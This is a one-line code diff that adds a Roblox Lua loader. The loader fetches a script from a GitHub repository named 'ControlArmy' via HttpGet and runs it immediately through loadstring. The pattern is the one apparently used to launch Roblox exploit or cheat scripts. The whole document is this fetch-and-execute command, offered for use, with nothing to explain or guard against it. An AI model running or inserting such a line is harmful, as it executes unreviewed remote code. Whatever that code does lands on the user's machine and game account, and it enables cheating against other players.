@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/applless/ControlArmy/raw/main/Main"))()
